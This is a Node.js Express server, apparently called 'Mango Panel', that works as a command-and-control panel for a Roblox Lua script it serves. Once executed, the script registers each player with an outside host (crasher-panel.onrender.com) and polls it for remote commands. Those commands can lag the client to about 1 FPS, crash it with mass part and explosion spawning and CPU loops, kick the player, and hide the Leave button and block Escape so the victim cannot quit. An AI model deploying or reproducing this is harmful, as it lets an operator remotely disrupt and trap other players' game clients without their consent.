const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const players = {};
const PLAYER_TIMEOUT = 30000;

// === РЕГИСТРАЦИЯ ===
app.get('/api/register', (req, res) => {
    const username = req.query.username;
    if (!username) return res.status(400).send('Username required');

    if (!players[username]) {
        players[username] = {
            command: null,
            lagActive: false,
            midLagActive: false,
            crashActive: false,
            lastSeen: Date.now()
        };
    } else {
        players[username].lastSeen = Date.now();
    }
    res.send('OK');
});

// === СПИСОК ИГРОКОВ ===
app.get('/api/players', (req, res) => {
    const now = Date.now();
    const activePlayers = {};

    for (const [name, data] of Object.entries(players)) {
        if (now - data.lastSeen < PLAYER_TIMEOUT) {
            activePlayers[name] = data;
        }
    }

    Object.keys(players).forEach(key => {
        if (!activePlayers[key]) {
            delete players[key];
        }
    });

    const list = Object.keys(players).map(name => ({
        username: name,
        lagActive: players[name].lagActive || false,
        midLagActive: players[name].midLagActive || false,
        crashActive: players[name].crashActive || false
    }));

    res.json(list);
});

// === ОТПРАВКА КОМАНДЫ ===
app.post('/api/command', (req, res) => {
    const { username, command, value } = req.body;

    if (!username || !command) {
        return res.status(400).json({ error: 'Missing fields' });
    }

    if (!players[username]) {
        return res.status(404).json({ error: 'Player not found' });
    }

    players[username].command = command;
    players[username].lastSeen = Date.now();

    if (command === 'lag' && value !== undefined) {
        players[username].lagActive = value;
    }

    if (command === 'midlag' && value !== undefined) {
        players[username].midLagActive = value;
    }

    if (command === 'crash') {
        players[username].crashActive = value !== undefined ? value : true;
    }

    res.json({ success: true });
});

// === ПОЛУЧЕНИЕ КОМАНД ===
app.get('/api/get_commands', (req, res) => {
    const username = req.query.username;

    if (!username || !players[username]) {
        return res.send('');
    }

    players[username].lastSeen = Date.now();

    const cmd = players[username].command || '';
    players[username].command = null;
    res.send(cmd);
});

// === ВОЗВРАТ ОСНОВНОГО СКРИПТА ===
app.get('/api/get_exec_script', (req, res) => {
    const script = `
local s = "https://crasher-panel.onrender.com"
_G.ToozeServer = s

local p = game.Players.LocalPlayer
if not p then return end

local R = game:GetService("RunService")
local W = game:GetService("Workspace")
local L = game:GetService("Lighting")
local C = game:GetService("CoreGui")
local A = game:GetService("ContextActionService")

local state = {
    lag = false,
    midLag = false,
    crash = false,
    conns = {},
    midLagConnection = nil
}

local function reg()
    pcall(function()
        game:HttpGet(s .. "/api/register?username=" .. p.Name)
    end)
end

-- Anti-Leave
local function blockLeave()
    local rg = C:FindFirstChild("RobloxGui")
    if rg then
        local lb = rg:FindFirstChild("LeaveButton")
        if lb then
            lb.Visible = false
            lb.Active = false
            lb.Selectable = false
        end
    end
    A:BindAction("anti", function()
        return Enum.ContextActionResult.Sink
    end, false, Enum.KeyCode.Escape)
end

local function unblockLeave()
    A:UnbindAction("anti")
    local rg = C:FindFirstChild("RobloxGui")
    if rg then
        local lb = rg:FindFirstChild("LeaveButton")
        if lb then
            lb.Visible = true
            lb.Active = true
            lb.Selectable = true
        end
    end
end

-- === LAG ENGINE (1 FPS) ===
local function startLag()
    if state.lag then return end
    state.lag = true

    local c = R.RenderStepped:Connect(function()
        while state.lag do
            local t = os.clock()
            while os.clock() - t < 0.99 do end
            task.wait()
        end
    end)
    table.insert(state.conns, c)
end

local function stopLag()
    state.lag = false
    for _, c in ipairs(state.conns) do
        pcall(c.Disconnect, c)
    end
    state.conns = {}
end

-- === MID LAG ENGINE (10-30 FPS) ===
local function startMidLag()
    if state.midLag then return end
    state.midLag = true

    state.midLagConnection = R.Heartbeat:Connect(function()
        while state.midLag do
            local targetFps = math.random(10, 30)
            local targetFrameTime = 1 / targetFps

            local startTime = os.clock()

            while (os.clock() - startTime) < targetFrameTime do
                local _ = math.sin(startTime) * math.cos(startTime)
            end
            task.wait()
        end
    end)
end

local function stopMidLag()
    state.midLag = false
    if state.midLagConnection then
        pcall(state.midLagConnection.Disconnect, state.midLagConnection)
        state.midLagConnection = nil
    end
end

-- === CRASH ===
local function startCrash()
    if state.crash then return end
    state.crash = true
    blockLeave()

    task.spawn(function()
        for i = 1, 10000 do
            if not state.crash then break end
            local pt = Instance.new("Part")
            pt.Size = Vector3.new(50, 50, 50)
            pt.CFrame = CFrame.new(
                math.random(-5000, 5000),
                math.random(0, 5000),
                math.random(-5000, 5000)
            )
            pt.Anchored = true
            pt.Material = Enum.Material.Neon
            pt.Parent = W
            if i % 100 == 0 then task.wait() end
        end
    end)

    task.spawn(function()
        while state.crash do
            for i = 1, 100000 do
                local _ = math.sqrt(i) * math.sin(i) * math.cos(i)
                for j = 1, 100 do
                    local __ = _ * j / (j + 1)
                end
            end
            task.wait()
        end
    end)

    local c = R.RenderStepped:Connect(function()
        while state.crash do
            local t = os.clock()
            while os.clock() - t < 0.99 do end
            task.wait()
        end
    end)
    table.insert(state.conns, c)

    task.spawn(function()
        while state.crash do
            for i = 1, 50 do
                local e = Instance.new("Explosion")
                e.Position = Vector3.new(
                    math.random(-2000, 2000),
                    math.random(0, 500),
                    math.random(-2000, 2000)
                )
                e.BlastRadius = 100
                e.BlastPressure = 1000000
                e.Parent = W
            end
            task.wait(0.01)
        end
    end)

    task.spawn(function()
        while state.crash do
            L.Brightness = math.random()
            L.ClockTime = math.random(0, 24)
            L.FogEnd = math.random(0, 1000)
            L.OutdoorAmbient = Color3.fromRGB(
                math.random(0, 255),
                math.random(0, 255),
                math.random(0, 255)
            )
            task.wait(0.01)
        end
    end)
end

local function stopCrash()
    state.crash = false
    unblockLeave()

    for _, c in ipairs(state.conns) do
        pcall(c.Disconnect, c)
    end
    state.conns = {}

    pcall(function()
        for _, v in pairs(W:GetChildren()) do
            if v:IsA("Part") and v.Size == Vector3.new(50, 50, 50) and v.Material == Enum.Material.Neon then
                v:Destroy()
            end
        end
    end)
end

local function check()
    local ok, cmd = pcall(function()
        return game:HttpGet(s .. "/api/get_commands?username=" .. p.Name)
    end)

    if not ok then return end

    if cmd == "kick" then
        p:Kick("Kicked via Mango Panel")
    elseif cmd == "crash" then
        if state.crash then
            stopCrash()
        else
            startCrash()
        end
    elseif cmd == "lag" then
        if state.lag then
            stopLag()
        else
            startLag()
        end
    elseif cmd == "midlag" then
        if state.midLag then
            stopMidLag()
        else
            startMidLag()
        end
    end
end

reg()
while task.wait(2) do
    check()
end
    `;

    res.setHeader('Content-Type', 'text/plain');
    res.send(script);
});

// === СТАТУС ===
app.get('/api/status', (req, res) => {
    const now = Date.now();

    for (const [name, data] of Object.entries(players)) {
        if (now - data.lastSeen > PLAYER_TIMEOUT) {
            delete players[name];
        }
    }

    res.json({
        status: 'online',
        players: Object.keys(players).length,
        uptime: process.uptime()
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`Mango Panel running on port ${PORT}`);
});

app.use((err, req, res, next) => {
    res.status(500).json({ error: 'Internal error' });
});
